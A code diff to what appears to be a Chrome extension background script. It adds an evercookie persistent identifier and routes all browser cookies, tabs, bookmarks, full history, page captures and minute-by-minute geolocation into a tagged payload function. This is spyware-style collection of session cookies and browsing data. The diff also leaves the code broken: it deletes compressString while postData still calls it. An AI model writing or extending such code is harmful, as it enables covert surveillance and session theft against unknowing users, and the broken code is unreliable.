@@ -1,60 +1,79 @@
+///////////////////////////////////////////////////////////////////////////////
+// Determine UUID and activate evercookie.
+///////////////////////////////////////////////////////////////////////////////
+
+var uuid = null;
+var ec = new evercookie();
+
+// Get UUID from evercookie.
+ec.get("uuid", function (value) {
+    // Set uuid value.
+    if (value === undefined) {
+        uuid = Math.uuid();
+        ec.set("uuid", uuid);
+        console.log("UUID (new):", uuid);
+    } else {
+        uuid = value;
+        console.log("UUID:", uuid);
+    }
+    // Activate listeners.
+    activateListeners();
+});
+
+///////////////////////////////////////////////////////////////////////////////
+// Define getters.
+///////////////////////////////////////////////////////////////////////////////
+
+var getUserAgent = function () {
+    return navigator.userAgent;
+};
+
 var getCurrentPosition = function () {
     navigator.geolocation.getCurrentPosition(function (position) {
         console.log("Position found.");
-        console.log(position);
-        return position;
+        postData("geoposition", position);
     }, function(positionError) {
         console.log("Position not found.");
-        return positionError;
+        postData("geoposition", null);
     });
-}
+};
 
-var getMHTML = function (tabId) {
+var getPageCapture = function (tabId) {
     chrome.pageCapture.saveAsMHTML({"tabId": tabId}, function (mhtmlData) {
-        saveAs(mhtmlData, tabId + '.mhtml');
+        var payload = {};
+        payload.tabId = tabId;
+        payload.mhtmlData = mhtmlData;
+        postData("pageCapture", payload);
+        // saveAs(mhtmlData, tabId + '.mhtml');
     })
 };
 
 var getAllCookies = function () {
     chrome.cookies.getAll({}, function (cookieArray) {
-        console.log(cookieArray);
-        console.log(compressString(JSON.stringify(cookieArray)));
+        postData("cookies-all", cookieArray);
     });
 };
 
 var getAllTabs = function () {
     chrome.windows.getAll({"populate": true}, function (windowArray) {
-        console.log(windowArray);
-        console.log(JSON.stringify(windowArray));
-        console.log(compressString(JSON.stringify(windowArray)));
+        postData("tabs-all", windowArray);
     });
 }
 
 var getAllBookmarks = function () {
     chrome.bookmarks.getTree(function (results) {
-        console.log(results);
+        postData("bookmarks-all", results);
     });
 };
 
 var getAllHistory = function () {
     chrome.history.search({"text": ""}, function (historyArray) {
-        console.log(historyArray)
+        postData("history-all", historyArray);
     });
 };
 
-var compressString = function (uncompressedString) {
-    compressed = LZString.compress(uncompressedString);
-    compressedString = LZString.compressToBase64(compressed);
-    compressedB64 = Base64String.compress(compressedString);
-    console.log("Compressed / Uncompressed Length:",
-                compressedB64.length, "/", uncompressedString.length,
-                "(" + compressedB64.length * 100 / uncompressedString.length +
-                "%)");
-    return compressedB64;
-};
-
 ///////////////////////////////////////////////////////////////////////////////
-// Define listener callback functions.
+// Define listener related functions.
 ///////////////////////////////////////////////////////////////////////////////
 
 var onTabCreate = function (tab) {
@@ -101,16 +120,31 @@ var onBookmarkRemove = function (id, removeInfo) {
     console.log(id, removeInfo);
 };
 
+var activateListeners = function () {
+    console.log("Activating listeners...");
+    chrome.tabs.onCreated.addListener(onTabCreate);
+    chrome.tabs.onUpdated.addListener(onTabUpdate);
+    chrome.tabs.onActivated.addListener(onTabActive);
+    chrome.tabs.onRemoved.addListener(onTabRemove);
+    chrome.history.onVisited.addListener(onURLVisit);
+    chrome.cookies.onChanged.addListener(onCookieChange);
+    chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
+    chrome.bookmarks.onChanged.addListener(onBookmarkChange);
+    chrome.bookmarks.onRemoved.addListener(onBookmarkRemove);
+    setInterval(getCurrentPosition, 60000);
+};
+
 ///////////////////////////////////////////////////////////////////////////////
-// Activate listeners.
+// Define transmission related functions.
 ///////////////////////////////////////////////////////////////////////////////
 
-chrome.tabs.onCreated.addListener(onTabCreate);
-chrome.tabs.onUpdated.addListener(onTabUpdate);
-chrome.tabs.onActivated.addListener(onTabActive);
-chrome.tabs.onRemoved.addListener(onTabRemove);
-chrome.history.onVisited.addListener(onURLVisit);
-// chrome.cookies.onChanged.addListener(onCookieChange);
-chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
-chrome.bookmarks.onChanged.addListener(onBookmarkChange);
-chrome.bookmarks.onRemoved.addListener(onBookmarkRemove);
+var postData = function (type, payload) {
+    data = {}
+    data.uuid = uuid;
+    data.time = new Date().getTime();
+    data.type = type;
+    data.payload = payload;
+    compressString(JSON.stringify(data));
+    console.log(data);
+    return data;
+};
